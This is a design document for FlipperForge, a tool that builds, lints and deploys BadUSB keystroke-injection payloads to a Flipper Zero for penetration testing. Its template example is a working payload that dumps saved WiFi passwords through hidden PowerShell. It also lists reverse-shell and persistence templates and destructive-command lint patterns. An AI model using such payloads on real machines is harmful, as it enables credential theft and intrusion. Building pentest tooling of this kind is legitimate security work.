# FlipperForge - BadUSB Payload Workshop

**Date:** 2026-04-04
**Author:** TiltedLunar123
**Status:** Approved

## Overview

FlipperForge is a CLI-first Python tool for building, validating, and deploying BadUSB (DuckyScript) payloads to a Flipper Zero. It provides a template engine with parameterized payloads, a DuckyScript parser with safety-focused linting, USB serial deployment, and MITRE ATT&CK tagging on every payload.

## Goals

- Streamline the BadUSB payload development workflow for authorized pentesting
- Provide safety guardrails (scope notes, confirmation prompts, dangerous pattern detection)
- Map every payload to MITRE ATT&CK techniques for pentest reporting
- Ship a usable CLI v1; GUI (PyQt6) deferred to v2

## Non-Goals

- Not a general Flipper Zero management tool (no IR, NFC, Sub-GHz management)
- Not a firmware modifier or Flipper OS tool
- Not intended for unauthorized use

## Tech Stack

- **Python 3.11+**
- **Click** - CLI framework
- **Rich** - Terminal formatting, tables, syntax highlighting
- **PySerial** - USB serial communication with Flipper Zero
- **Jinja2** - Template parameter substitution
- **PyYAML** - Template file parsing

## Architecture

```
FlipperForge/
  flipperforge/
    __init__.py
    cli.py                 # Click CLI entry point
    engine/
      __init__.py
      parser.py            # DuckyScript tokenizer + validator
      linter.py            # Safety-focused lint rules
      compiler.py          # Template params -> final DuckyScript
    templates/
      __init__.py
      loader.py            # Discovers and loads YAML template files
    deploy/
      __init__.py
      serial.py            # USB serial comms with Flipper Zero
    library/
      __init__.py
      manager.py           # Payload CRUD, search, tagging
    mitre/
      __init__.py
      mapper.py            # ATT&CK technique metadata + lookups
      attack_data.json     # Local ATT&CK technique snapshot
  templates/               # YAML template files (built-in payloads)
    credential-access/
    execution/
    persistence/
    discovery/
    exfiltration/
  payloads/                # User's saved/generated payloads
  tests/
  pyproject.toml
```

## Build Cache (State Persistence)

CLI commands `build`, `preview`, and `deploy` share state through a local build cache directory at `.flipperforge/cache/` in the project root (or `~/.flipperforge/cache/` for global installs).

- `flipperforge build` compiles a payload and writes the result to `.flipperforge/cache/last_build.txt` (the DuckyScript output) and `.flipperforge/cache/last_build_meta.json` (template name, parameters used, timestamp, MITRE tags).
- `flipperforge preview` reads `.flipperforge/cache/last_build.txt` and displays it with Rich syntax highlighting.
- `flipperforge deploy` reads `.flipperforge/cache/last_build.txt` and pushes it to the Flipper.
- If no cached build exists, `preview` and `deploy` print an error: `No compiled payload found. Run 'flipperforge build <template>' first.`

The cache is a simple file-based approach — no database required.

## Payload Library (library/manager.py)

The library manager handles saved payloads in the `payloads/` directory:

- **Save:** After a `build`, the user can save the compiled payload with a name: `flipperforge save <name>`. Writes the `.txt` payload and a `.meta.json` sidecar (template source, parameters, MITRE tags, creation date).
- **List:** `flipperforge library ls` lists all saved payloads with name, MITRE technique, and date.
- **Load:** `flipperforge library load <name>` loads a saved payload into the build cache for `preview`/`deploy`.
- **Delete:** `flipperforge library rm <name>` removes a saved payload (with confirmation).
- **Search:** `flipperforge library search <query>` searches by name, tactic, or technique ID.

Storage is flat files in `payloads/` — each saved payload is a pair: `<name>.txt` + `<name>.meta.json`.

## Template Format

Templates are YAML files with metadata, parameters, safety info, and a DuckyScript body:

```yaml
name: wifi-password-exfil
description: Extracts saved WiFi passwords to a text file on the Flipper
author: TiltedLunar123
version: "1.0"
mitre:
  tactic: credential-access
  technique: T1555
  subtechnique: T1555.005
platform: windows
parameters:
  - name: output_file
    type: string
    default: "wifi_creds.txt"
    description: "Filename to save on Flipper SD card"
  - name: delay_ms
    type: integer
    default: 500
    description: "Delay between keystrokes (ms), increase for slower targets"
safety:
  requires_confirmation: true
  scope_note: "Only use on systems you own or have written authorization to test"
script: |
  REM FlipperForge: wifi-password-exfil
  REM Authorization required before execution
  DELAY {{ delay_ms }}
  GUI r
  DELAY 500
  STRING powershell -w hidden -c "netsh wlan show profiles | Select-String ':(.+)$' | ForEach { $p = $_.Matches.Groups[1].Value.Trim(); netsh wlan show profile name=$p key=clear } | Out-File {{ output_file }}"
  ENTER
```

### Parameter Substitution

Jinja2 templating: `{{ param_name }}` in the script body gets replaced with user-supplied or default values at compile time. The compiler validates types before substitution.

**Supported parameter types:**
- `string` — Free text. Validated: max 500 chars, no null bytes. Shell metacharacters are allowed (payloads are intentionally shell commands) but the linter warns on common injection patterns within parameter values themselves.
- `integer` — Whole number. Validated: must parse as int, optional `min`/`max` constraints in template.
- `boolean` — `true`/`false`. Rendered as the literal string `true` or `false` in the script.
- `choice` — One of a predefined set of values. Template declares `choices: [opt1, opt2, opt3]`.

### Template Discovery

Templates are discovered by scanning `templates/` recursively for `.yaml` files. Each subdirectory corresponds to a MITRE ATT&CK tactic.

## DuckyScript Engine

### Parser (parser.py)

Tokenizes and validates Flipper-flavored DuckyScript:

**Supported commands:**
- `STRING <text>` - Type a string
- `DELAY <ms>` - Wait N milliseconds
- `GUI`, `CTRL`, `ALT`, `SHIFT` - Modifier keys (combinable: `CTRL ALT DELETE`)
- `ENTER`, `TAB`, `ESCAPE`, `SPACE`, `BACKSPACE`, `DELETE`
- `UP`, `DOWN`, `LEFT`, `RIGHT`, `HOME`, `END`, `PAGEUP`, `PAGEDOWN`
- `F1`-`F12` - Function keys
- `REM <comment>` - Comment line
- `REPEAT <n>` - Repeat previous command

**Validation errors:**
- Unknown commands/keys with suggestions (`CNTRL` -> `CTRL`)
- Missing required arguments (`STRING` with no text)
- Invalid DELAY values (non-numeric, negative)

### Linter (linter.py)

Safety-focused warnings (not blockers):

- **No initial delay:** Warns if script doesn't start with a DELAY (target may not be ready)
- **Short delays:** Flags DELAY < 100ms after GUI/key combos (unreliable on slow systems)
- **No cleanup:** Warns if script doesn't close opened windows/terminals at the end
- **Dangerous commands:** Flags `format`, `rm -rf`, `del /f /s`, disk wipe patterns
- **No REM header:** Suggests adding a description comment at the top
- **Missing confirmation pause:** Warns if `safety.requires_confirmation` is true but the script has no `DELAY` of 2000ms or longer in the first 5 lines. The intent is that the operator has a window to physically abort (pull the Flipper) before destructive commands run. This is a heuristic, not a guarantee.

All warnings include line numbers and suggested fixes. Output via Rich formatting.

### Compiler (compiler.py)

1. Load template YAML
2. Prompt user for parameters (or accept CLI flags)
3. Validate parameter types
4. Render Jinja2 template with parameters
5. Run parser + linter on the rendered output
6. Return final DuckyScript payload

## Flipper Deployment (serial.py)

### Connection

- Auto-detect Flipper Zero on USB (scans COM ports for Flipper's USB VID/PID)
- Manual port override: `--port COM3`
- Connection verification: sends a ping, confirms Flipper responds

### Operations

- **Deploy:** Write `.txt` payload file to Flipper SD at `/ext/badusb/`
- **List:** Show all payloads currently on the Flipper
- **Pull:** Copy a payload from Flipper to local machine for editing
- **Delete:** Remove a payload from the Flipper (with confirmation)

### Protocol

Uses Flipper Zero's serial CLI protocol over USB CDC (VID: `0x0483`, PID: `0x5740`). Baud rate: 115200. The Flipper exposes an interactive CLI over USB serial; commands are sent as ASCII text terminated by `\r\n`, and responses are read until the next `>: ` prompt.

**Commands used:**
- `storage list /ext/badusb` — Returns one line per entry: `[F]` for files, `[D]` for directories, followed by name and size.
- `storage read /ext/badusb/<file>` — Returns file contents as raw bytes until the next CLI prompt.
- `storage write_chunk /ext/badusb/<file> <offset>` — Flipper enters binary receive mode. Send the chunk bytes followed by `\x00` to signal end. Used for writing payloads in a single chunk (payloads are small, typically under 4KB). After the write, verify with `storage stat` to confirm file size.
- `storage remove /ext/badusb/<file>` — Deletes the file. Returns `OK` or error.

**Error detection:** If a command fails, the Flipper returns a line starting with `Storage error:` before the next prompt. The serial module parses this and raises a descriptive exception.

**Timeout:** 5-second timeout on all serial reads. If no response, retry once, then raise `FlipperConnectionError`.

## MITRE ATT&CK Integration (mapper.py)

### Data Source

Ships with a local JSON snapshot of ATT&CK Enterprise techniques (extracted from MITRE's STIX data). Contains:
- Technique ID, name, description
- Tactic mappings
- Sub-technique relationships

### Usage

- Templates declare `mitre.tactic` and `mitre.technique`
- `flipperforge list --tactic <name>` filters templates by tactic
- `flipperforge list --technique <id>` filters by technique ID
- `flipperforge info <template>` shows full ATT&CK context for a payload

## CLI Commands

```
flipperforge list [--tactic NAME] [--technique ID]
    Browse available templates, optionally filtered

flipperforge info <template_name>
    Show template details: description, params, MITRE mapping, safety notes

flipperforge build <template_name> [--param key=value ...]
    Compile a template with parameters, interactive or flag-based

flipperforge preview
    Show the last compiled payload with syntax highlighting

flipperforge validate <file>
    Run parser + linter on any DuckyScript file

flipperforge deploy [--port PORT] [--name FILENAME]
    Push the last compiled payload to Flipper Zero

flipperforge device ls [--port PORT]
    List BadUSB payloads on the Flipper

flipperforge device pull <filename> [--port PORT]
    Copy a payload from Flipper to local payloads/

flipperforge device rm <filename> [--port PORT]
    Delete a payload from the Flipper (with confirmation)
```

## Error Handling

- **No Flipper connected:** Clear message with troubleshooting steps (check cable, drivers, Flipper USB mode)
- **Serial timeout:** Retry once, then report with port info
- **Template errors:** Show YAML parse errors with file path and line
- **DuckyScript errors:** Show line number, the offending line, and a suggestion
- **Parameter type mismatch:** Show expected vs. provided type

## Packaging

`pyproject.toml` defines the project with a console script entry point:

```toml
[project.scripts]
flipperforge = "flipperforge.cli:main"
```

Installable via `pip install -e .` for development or `pip install .` for use. All dependencies (Click, Rich, PySerial, Jinja2, PyYAML) specified with minimum versions.

## Testing Strategy

- **Framework:** pytest
- **Unit tests:** Parser, linter, compiler, template loader — no hardware needed. These are the priority; target full coverage of the engine module.
- **Integration tests:** Serial communication using `unittest.mock.patch` on `serial.Serial` to simulate Flipper responses. Test connection, file listing, deploy, and error paths.
- **Template tests:** Parametrized pytest test that loads every built-in template YAML and runs it through the compiler with default parameters — must produce valid DuckyScript with no parser errors.
- **CLI tests:** Click's `CliRunner` for invoking commands and asserting output/exit codes.

## Built-in Templates (v1)

Ship with 6 starter templates across different tactics:

1. **discovery/system-info** (T1082) - Collect OS, hostname, IP, user info
2. **credential-access/wifi-passwords** (T1555.005) - Extract saved WiFi credentials
3. **execution/reverse-shell** (T1059.001) - PowerShell reverse shell (configurable host/port)
4. **persistence/scheduled-task** (T1053.005) - Create a scheduled task for persistence
5. **exfiltration/file-grab** (T1005) - Copy specific files to Flipper SD
6. **discovery/network-scan** (T1046) - Quick network discovery via PowerShell

Each template includes clear authorization warnings and scope documentation.

## Future (v2)

- PyQt6 GUI with visual editor, template browser, device panel
- Payload chaining: run multiple payloads in sequence
- Target profiles: save delay/timing configs per target machine type
- Community template repository
